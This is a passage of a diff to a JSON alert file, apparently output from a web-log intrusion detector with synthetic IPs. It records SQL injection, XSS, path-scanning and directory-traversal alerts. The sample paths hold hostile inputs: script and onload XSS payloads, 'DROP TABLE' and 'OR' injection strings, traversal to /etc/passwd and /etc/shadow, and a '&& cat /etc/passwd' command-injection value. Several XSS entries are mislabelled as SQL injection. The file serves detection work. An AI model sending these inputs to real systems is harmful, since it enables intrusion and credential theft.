+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<body+onload=alert('xss')>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.931850",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 207.150.171.251",
+    "evidence": {
+      "source_ip": "207.150.171.251",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q=admin'+--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.931892",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 66.87.35.105",
+    "evidence": {
+      "source_ip": "66.87.35.105",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q=';+DROP+TABLE+users--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.931967",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 193.228.109.1",
+    "evidence": {
+      "source_ip": "193.228.109.1",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<svg/onload=alert('xss')>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.932067",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 166.29.69.163",
+    "evidence": {
+      "source_ip": "166.29.69.163",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<body+onload=alert('xss')>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.932162",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 32.153.124.196",
+    "evidence": {
+      "source_ip": "32.153.124.196",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q='+OR+'x'='x"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.932218",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 139.6.26.216",
+    "evidence": {
+      "source_ip": "139.6.26.216",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<script>alert('xss')</script>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.932265",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 15.206.144.208",
+    "evidence": {
+      "source_ip": "15.206.144.208",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q=admin'+--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.932304",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 163.82.200.94",
+    "evidence": {
+      "source_ip": "163.82.200.94",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<iframe+src='javascript:alert(1)'>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.932343",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 19.132.174.22",
+    "evidence": {
+      "source_ip": "19.132.174.22",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<iframe+src='javascript:alert(1)'>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.960558",
     "rule": "Port Scanning / Path Enumeration",
     "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 200.173.128.133 (13 unique paths)",
+    "description": "Detected scanning behavior from 138.25.72.115 (13 unique paths)",
     "evidence": {
-      "source_ip": "200.173.128.133",
+      "source_ip": "138.25.72.115",
       "unique_paths": 13,
       "sample_paths": [
-        "/wp-admin",
+        "/api/v3",
+        "/phpmyadmin",
         "/admin/dashboard",
         "/admin",
-        "/api/v1",
         "/api/v2"
       ],
       "request_count": 13
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.192566",
+    "timestamp": "2026-02-24T00:08:44.960754",
     "rule": "Port Scanning / Path Enumeration",
     "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 44.85.149.84 (13 unique paths)",
+    "description": "Detected scanning behavior from 223.19.86.90 (13 unique paths)",
     "evidence": {
-      "source_ip": "44.85.149.84",
+      "source_ip": "223.19.86.90",
       "unique_paths": 13,
       "sample_paths": [
-        "/wp-admin",
-        "/admin/dashboard",
+        "/phpmyadmin",
         "/admin",
-        "/api/v1",
-        "/api/v3"
+        "/admin/dashboard",
+        "/api/v2",
+        "/wp-admin"
       ],
       "request_count": 13
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.192713",
+    "timestamp": "2026-02-24T00:08:44.960854",
     "rule": "Port Scanning / Path Enumeration",
     "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 215.51.219.222 (13 unique paths)",
+    "description": "Detected scanning behavior from 47.108.154.222 (13 unique paths)",
     "evidence": {
-      "source_ip": "215.51.219.222",
+      "source_ip": "47.108.154.222",
       "unique_paths": 13,
       "sample_paths": [
-        "/wp-admin",
+        "/phpmyadmin",
         "/admin/dashboard",
         "/admin",
-        "/api/v1",
-        "/api/v3"
+        "/api/v2",
+        "/wp-admin"
       ],
       "request_count": 13
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.192874",
+    "timestamp": "2026-02-24T00:08:44.960952",
     "rule": "Port Scanning / Path Enumeration",
     "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 145.133.167.69 (13 unique paths)",
+    "description": "Detected scanning behavior from 74.92.50.37 (13 unique paths)",
     "evidence": {
-      "source_ip": "145.133.167.69",
+      "source_ip": "74.92.50.37",
       "unique_paths": 13,
       "sample_paths": [
-        "/wp-admin",
-        "/admin/dashboard",
+        "/phpmyadmin",
         "/admin",
-        "/api/v1",
+        "/admin/dashboard",
+        "/api/v2",
+        "/wp-admin"
+      ],
+      "request_count": 13
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.961044",
+    "rule": "Port Scanning / Path Enumeration",
+    "severity": "MEDIUM",
+    "description": "Detected scanning behavior from 131.215.174.110 (13 unique paths)",
+    "evidence": {
+      "source_ip": "131.215.174.110",
+      "unique_paths": 13,
+      "sample_paths": [
+        "/api/v3",
+        "/phpmyadmin",
+        "/admin",
+        "/admin/dashboard",
         "/api/v2"
       ],
       "request_count": 13
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.193034",
+    "timestamp": "2026-02-24T00:08:44.961124",
     "rule": "Port Scanning / Path Enumeration",
     "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 184.151.39.205 (13 unique paths)",
+    "description": "Detected scanning behavior from 24.108.136.147 (13 unique paths)",
     "evidence": {
-      "source_ip": "184.151.39.205",
+      "source_ip": "24.108.136.147",
       "unique_paths": 13,
       "sample_paths": [
-        "/wp-admin",
-        "/admin/dashboard",
+        "/phpmyadmin",
         "/admin",
-        "/api/v1",
-        "/api/v4"
+        "/admin/dashboard",
+        "/api/v2",
+        "/wp-admin"
       ],
       "request_count": 13
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.193120",
+    "timestamp": "2026-02-24T00:08:44.961193",
     "rule": "Port Scanning / Path Enumeration",
     "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 186.207.174.5 (13 unique paths)",
+    "description": "Detected scanning behavior from 220.116.58.13 (13 unique paths)",
     "evidence": {
-      "source_ip": "186.207.174.5",
+      "source_ip": "220.116.58.13",
       "unique_paths": 13,
       "sample_paths": [
-        "/wp-admin",
+        "/phpmyadmin",
+        "/admin",
+        "/admin/dashboard",
+        "/api/v2",
+        "/wp-admin"
+      ],
+      "request_count": 13
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.961280",
+    "rule": "Port Scanning / Path Enumeration",
+    "severity": "MEDIUM",
+    "description": "Detected scanning behavior from 122.10.125.63 (13 unique paths)",
+    "evidence": {
+      "source_ip": "122.10.125.63",
+      "unique_paths": 13,
+      "sample_paths": [
+        "/phpmyadmin",
+        "/admin",
+        "/admin/dashboard",
+        "/api/v2",
+        "/wp-admin"
+      ],
+      "request_count": 13
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.961359",
+    "rule": "Port Scanning / Path Enumeration",
+    "severity": "MEDIUM",
+    "description": "Detected scanning behavior from 201.90.207.213 (13 unique paths)",
+    "evidence": {
+      "source_ip": "201.90.207.213",
+      "unique_paths": 13,
+      "sample_paths": [
+        "/phpmyadmin",
         "/admin/dashboard",
         "/admin",
-        "/api/v1",
+        "/api/v2",
+        "/wp-admin"
+      ],
+      "request_count": 13
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.961459",
+    "rule": "Port Scanning / Path Enumeration",
+    "severity": "MEDIUM",
+    "description": "Detected scanning behavior from 103.190.42.14 (13 unique paths)",
+    "evidence": {
+      "source_ip": "103.190.42.14",
+      "unique_paths": 13,
+      "sample_paths": [
+        "/api/v3",
+        "/phpmyadmin",
+        "/admin/dashboard",
+        "/admin",
         "/api/v2"
       ],
       "request_count": 13
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.193198",
+    "timestamp": "2026-02-24T00:08:44.961644",
     "rule": "Port Scanning / Path Enumeration",
     "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 20.213.221.67 (13 unique paths)",
+    "description": "Detected scanning behavior from 53.156.163.198 (13 unique paths)",
     "evidence": {
-      "source_ip": "20.213.221.67",
+      "source_ip": "53.156.163.198",
       "unique_paths": 13,
       "sample_paths": [
-        "/wp-admin",
-        "/admin/dashboard",
+        "/api/v3",
+        "/phpmyadmin",
         "/admin",
-        "/api/v1",
-        "/api/v3"
-      ],
-      "request_count": 13
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.193268",
-    "rule": "Port Scanning / Path Enumeration",
-    "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 13.232.100.247 (13 unique paths)",
-    "evidence": {
-      "source_ip": "13.232.100.247",
-      "unique_paths": 13,
-      "sample_paths": [
-        "/wp-admin",
         "/admin/dashboard",
-        "/admin",
-        "/api/v1",
-        "/api/v3"
-      ],
-      "request_count": 13
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.193524",
-    "rule": "Port Scanning / Path Enumeration",
-    "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 80.49.1.14 (13 unique paths)",
-    "evidence": {
-      "source_ip": "80.49.1.14",
-      "unique_paths": 13,
-      "sample_paths": [
-        "/wp-admin",
-        "/admin/dashboard",
-        "/admin",
-        "/api/v1",
         "/api/v2"
       ],
       "request_count": 13
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.193802",
+    "timestamp": "2026-02-24T00:08:44.961852",
     "rule": "Port Scanning / Path Enumeration",
     "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 165.163.120.107 (13 unique paths)",
+    "description": "Detected scanning behavior from 211.56.59.71 (13 unique paths)",
     "evidence": {
-      "source_ip": "165.163.120.107",
+      "source_ip": "211.56.59.71",
       "unique_paths": 13,
       "sample_paths": [
-        "/wp-admin",
-        "/admin/dashboard",
+        "/api/v3",
+        "/phpmyadmin",
         "/admin",
-        "/api/v1",
-        "/api/v3"
-      ],
-      "request_count": 13
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.194017",
-    "rule": "Port Scanning / Path Enumeration",
-    "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 102.34.134.160 (13 unique paths)",
-    "evidence": {
-      "source_ip": "102.34.134.160",
-      "unique_paths": 13,
-      "sample_paths": [
-        "/wp-admin",
         "/admin/dashboard",
-        "/admin",
-        "/api/v1",
-        "/api/v3"
-      ],
-      "request_count": 13
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.194106",
-    "rule": "Port Scanning / Path Enumeration",
-    "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 179.73.208.242 (13 unique paths)",
-    "evidence": {
-      "source_ip": "179.73.208.242",
-      "unique_paths": 13,
-      "sample_paths": [
-        "/wp-admin",
-        "/admin/dashboard",
-        "/admin",
-        "/api/v1",
-        "/api/v4"
-      ],
-      "request_count": 13
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.194211",
-    "rule": "Port Scanning / Path Enumeration",
-    "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 189.236.62.28 (13 unique paths)",
-    "evidence": {
-      "source_ip": "189.236.62.28",
-      "unique_paths": 13,
-      "sample_paths": [
-        "/wp-admin",
-        "/admin/dashboard",
-        "/admin",
-        "/api/v1",
-        "/api/v3"
-      ],
-      "request_count": 13
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.194306",
-    "rule": "Port Scanning / Path Enumeration",
-    "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 55.190.74.176 (13 unique paths)",
-    "evidence": {
-      "source_ip": "55.190.74.176",
-      "unique_paths": 13,
-      "sample_paths": [
-        "/wp-admin",
-        "/admin/dashboard",
-        "/admin",
-        "/api/v1",
-        "/api/v4"
-      ],
-      "request_count": 13
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.194419",
-    "rule": "Port Scanning / Path Enumeration",
-    "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 70.187.32.243 (13 unique paths)",
-    "evidence": {
-      "source_ip": "70.187.32.243",
-      "unique_paths": 13,
-      "sample_paths": [
-        "/wp-admin",
-        "/admin/dashboard",
-        "/admin",
-        "/api/v1",
         "/api/v2"
       ],
       "request_count": 13
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.194523",
+    "timestamp": "2026-02-24T00:08:44.961912",
     "rule": "Port Scanning / Path Enumeration",
     "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 47.50.77.210 (13 unique paths)",
+    "description": "Detected scanning behavior from 4.48.118.9 (13 unique paths)",
     "evidence": {
-      "source_ip": "47.50.77.210",
+      "source_ip": "4.48.118.9",
       "unique_paths": 13,
       "sample_paths": [
-        "/wp-admin",
-        "/admin/dashboard",
+        "/api/v3",
+        "/phpmyadmin",
         "/admin",
-        "/api/v1",
+        "/admin/dashboard",
         "/api/v2"
       ],
       "request_count": 13
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.194614",
+    "timestamp": "2026-02-24T00:08:44.961985",
     "rule": "Port Scanning / Path Enumeration",
     "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 207.5.18.109 (13 unique paths)",
+    "description": "Detected scanning behavior from 97.74.140.132 (13 unique paths)",
     "evidence": {
-      "source_ip": "207.5.18.109",
+      "source_ip": "97.74.140.132",
       "unique_paths": 13,
       "sample_paths": [
-        "/wp-admin",
+        "/api/v3",
+        "/phpmyadmin",
         "/admin/dashboard",
         "/admin",
-        "/api/v1",
         "/api/v2"
       ],
       "request_count": 13
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.194728",
+    "timestamp": "2026-02-24T00:08:44.962111",
     "rule": "Port Scanning / Path Enumeration",
     "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 125.116.212.11 (13 unique paths)",
+    "description": "Detected scanning behavior from 69.6.80.32 (13 unique paths)",
     "evidence": {
-      "source_ip": "125.116.212.11",
+      "source_ip": "69.6.80.32",
       "unique_paths": 13,
       "sample_paths": [
-        "/wp-admin",
+        "/phpmyadmin",
+        "/admin",
+        "/admin/dashboard",
+        "/api/v2",
+        "/wp-admin"
+      ],
+      "request_count": 13
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.962204",
+    "rule": "Port Scanning / Path Enumeration",
+    "severity": "MEDIUM",
+    "description": "Detected scanning behavior from 205.157.133.95 (13 unique paths)",
+    "evidence": {
+      "source_ip": "205.157.133.95",
+      "unique_paths": 13,
+      "sample_paths": [
+        "/phpmyadmin",
+        "/admin",
+        "/admin/dashboard",
+        "/api/v2",
+        "/wp-admin"
+      ],
+      "request_count": 13
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.962302",
+    "rule": "Port Scanning / Path Enumeration",
+    "severity": "MEDIUM",
+    "description": "Detected scanning behavior from 92.73.232.55 (13 unique paths)",
+    "evidence": {
+      "source_ip": "92.73.232.55",
+      "unique_paths": 13,
+      "sample_paths": [
+        "/api/v3",
+        "/phpmyadmin",
         "/admin/dashboard",
         "/admin",
-        "/api/v1",
         "/api/v2"
       ],
       "request_count": 13
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.194834",
+    "timestamp": "2026-02-24T00:08:44.962387",
     "rule": "Port Scanning / Path Enumeration",
     "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 106.218.39.55 (13 unique paths)",
+    "description": "Detected scanning behavior from 35.94.174.112 (13 unique paths)",
     "evidence": {
-      "source_ip": "106.218.39.55",
+      "source_ip": "35.94.174.112",
       "unique_paths": 13,
       "sample_paths": [
-        "/wp-admin",
-        "/admin/dashboard",
+        "/phpmyadmin",
         "/admin",
-        "/api/v1",
-        "/api/v4"
+        "/admin/dashboard",
+        "/api/v2",
+        "/wp-admin"
       ],
       "request_count": 13
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.194925",
+    "timestamp": "2026-02-24T00:08:44.962531",
     "rule": "Port Scanning / Path Enumeration",
     "severity": "MEDIUM",
-    "description": "Detected scanning behavior from 52.180.188.181 (13 unique paths)",
+    "description": "Detected scanning behavior from 109.171.56.143 (13 unique paths)",
     "evidence": {
-      "source_ip": "52.180.188.181",
+      "source_ip": "109.171.56.143",
       "unique_paths": 13,
       "sample_paths": [
-        "/wp-admin",
+        "/phpmyadmin",
+        "/admin",
+        "/admin/dashboard",
+        "/api/v2",
+        "/wp-admin"
+      ],
+      "request_count": 13
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.962752",
+    "rule": "Port Scanning / Path Enumeration",
+    "severity": "MEDIUM",
+    "description": "Detected scanning behavior from 212.143.110.49 (13 unique paths)",
+    "evidence": {
+      "source_ip": "212.143.110.49",
+      "unique_paths": 13,
+      "sample_paths": [
+        "/api/v3",
+        "/phpmyadmin",
         "/admin/dashboard",
         "/admin",
-        "/api/v1",
         "/api/v2"
       ],
       "request_count": 13
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.214506",
+    "timestamp": "2026-02-24T00:08:44.976183",
     "rule": "Directory Traversal Attempt",
     "severity": "HIGH",
-    "description": "Directory traversal attempts from 116.41.52.163",
+    "description": "Directory traversal attempts from 121.238.34.244",
     "evidence": {
-      "source_ip": "116.41.52.163",
+      "source_ip": "121.238.34.244",
       "attack_count": 1,
       "sample_paths": [
         "/download?file=....//....//....//etc/passwd"
@@ -2113,12 +2113,51 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.214665",
+    "timestamp": "2026-02-24T00:08:44.976363",
     "rule": "Directory Traversal Attempt",
     "severity": "HIGH",
-    "description": "Directory traversal attempts from 171.253.82.105",
+    "description": "Directory traversal attempts from 10.55.243.106",
     "evidence": {
-      "source_ip": "171.253.82.105",
+      "source_ip": "10.55.243.106",
+      "attack_count": 1,
+      "sample_paths": [
+        "/download?file=../../../etc/passwd"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.976477",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 126.169.170.240",
+    "evidence": {
+      "source_ip": "126.169.170.240",
+      "attack_count": 1,
+      "sample_paths": [
+        "/download?file=../../../etc/passwd"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.976575",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 17.62.28.85",
+    "evidence": {
+      "source_ip": "17.62.28.85",
+      "attack_count": 1,
+      "sample_paths": [
+        "/download?file=../../../etc/passwd"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.976664",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 171.195.14.173",
+    "evidence": {
+      "source_ip": "171.195.14.173",
       "attack_count": 1,
       "sample_paths": [
         "/download?file=..\\..\\..\\windows\\system.ini"
@@ -2126,51 +2165,25 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.214745",
+    "timestamp": "2026-02-24T00:08:44.976738",
     "rule": "Directory Traversal Attempt",
     "severity": "HIGH",
-    "description": "Directory traversal attempts from 155.217.127.210",
+    "description": "Directory traversal attempts from 22.246.89.95",
     "evidence": {
-      "source_ip": "155.217.127.210",
+      "source_ip": "22.246.89.95",
       "attack_count": 1,
       "sample_paths": [
-        "/ping?host=localhost&&+cat+/etc/passwd"
+        "/download?file=../../../../../../etc/hosts"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.214847",
+    "timestamp": "2026-02-24T00:08:44.976803",
     "rule": "Directory Traversal Attempt",
     "severity": "HIGH",
-    "description": "Directory traversal attempts from 193.122.48.178",
+    "description": "Directory traversal attempts from 164.195.91.126",
     "evidence": {
-      "source_ip": "193.122.48.178",
-      "attack_count": 1,
-      "sample_paths": [
-        "/ping?host=localhost&&+cat+/etc/passwd"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.214949",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 199.229.42.16",
-    "evidence": {
-      "source_ip": "199.229.42.16",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=..\\..\\..\\windows\\system.ini"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.215007",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 166.208.206.168",
-    "evidence": {
-      "source_ip": "166.208.206.168",
+      "source_ip": "164.195.91.126",
       "attack_count": 1,
       "sample_paths": [
         "/download?file=..//..//..//etc/shadow"
@@ -2178,259 +2191,12 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.215089",
+    "timestamp": "2026-02-24T00:08:44.976862",
     "rule": "Directory Traversal Attempt",
     "severity": "HIGH",
-    "description": "Directory traversal attempts from 193.171.21.195",
+    "description": "Directory traversal attempts from 66.244.22.165",
     "evidence": {
-      "source_ip": "193.171.21.195",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=..\\..\\..\\windows\\system.ini"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.215176",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 137.141.130.147",
-    "evidence": {
-      "source_ip": "137.141.130.147",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=../../../../../../etc/hosts"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.215347",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 207.252.89.47",
-    "evidence": {
-      "source_ip": "207.252.89.47",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=../../../../../../etc/hosts"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.215437",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 11.219.226.60",
-    "evidence": {
-      "source_ip": "11.219.226.60",
-      "attack_count": 1,
-      "sample_paths": [
-        "/ping?host=localhost&&+cat+/etc/passwd"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.215548",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 12.209.27.219",
-    "evidence": {
-      "source_ip": "12.209.27.219",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=..\\..\\..\\windows\\system.ini"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.215624",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 150.87.141.28",
-    "evidence": {
-      "source_ip": "150.87.141.28",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=..\\..\\..\\windows\\system.ini"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.215728",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 174.134.200.36",
-    "evidence": {
-      "source_ip": "174.134.200.36",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=..\\..\\..\\windows\\system.ini"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.215833",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 101.131.119.237",
-    "evidence": {
-      "source_ip": "101.131.119.237",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=../../../../../../etc/hosts"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.215915",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 125.126.150.193",
-    "evidence": {
-      "source_ip": "125.126.150.193",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=....//....//....//etc/passwd"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.216005",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 143.5.25.98",
-    "evidence": {
-      "source_ip": "143.5.25.98",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=../../../etc/passwd"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.216102",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 89.238.60.4",
-    "evidence": {
-      "source_ip": "89.238.60.4",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=....//....//....//etc/passwd"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.216174",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 222.38.114.51",
-    "evidence": {
-      "source_ip": "222.38.114.51",
-      "attack_count": 1,
-      "sample_paths": [
-        "/ping?host=localhost&&+cat+/etc/passwd"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.216252",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 107.185.24.85",
-    "evidence": {
-      "source_ip": "107.185.24.85",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=../../../etc/passwd"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.216316",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 115.72.115.155",
-    "evidence": {
-      "source_ip": "115.72.115.155",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=../../../etc/passwd"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.216384",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 133.37.90.20",
-    "evidence": {
-      "source_ip": "133.37.90.20",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=../../../../../../etc/hosts"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.216448",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 99.214.51.131",
-    "evidence": {
-      "source_ip": "99.214.51.131",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=....//....//....//etc/passwd"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.216505",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 137.20.161.24",
-    "evidence": {
-      "source_ip": "137.20.161.24",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=..\\..\\..\\windows\\system.ini"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.216567",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 107.59.162.234",
-    "evidence": {
-      "source_ip": "107.59.162.234",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=../../../etc/passwd"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.216649",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 175.250.210.240",
-    "evidence": {
-      "source_ip": "175.250.210.240",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=..\\..\\..\\windows\\system.ini"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.216719",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 154.219.18.47",
-    "evidence": {
-      "source_ip": "154.219.18.47",
+      "source_ip": "66.244.22.165",
       "attack_count": 1,
       "sample_paths": [
         "/download?file=..//..//..//etc/shadow"
@@ -2438,12 +2204,25 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.216785",
+    "timestamp": "2026-02-24T00:08:44.976943",
     "rule": "Directory Traversal Attempt",
     "severity": "HIGH",
-    "description": "Directory traversal attempts from 50.220.200.220",
+    "description": "Directory traversal attempts from 2.84.200.193",
     "evidence": {
-      "source_ip": "50.220.200.220",
+      "source_ip": "2.84.200.193",
+      "attack_count": 1,
+      "sample_paths": [
+        "/download?file=..\\..\\..\\windows\\system.ini"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.977048",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 103.122.212.86",
+    "evidence": {
+      "source_ip": "103.122.212.86",
       "attack_count": 1,
       "sample_paths": [
         "/download?file=../../../etc/passwd"
@@ -2451,77 +2230,38 @@
     }
   },
   {
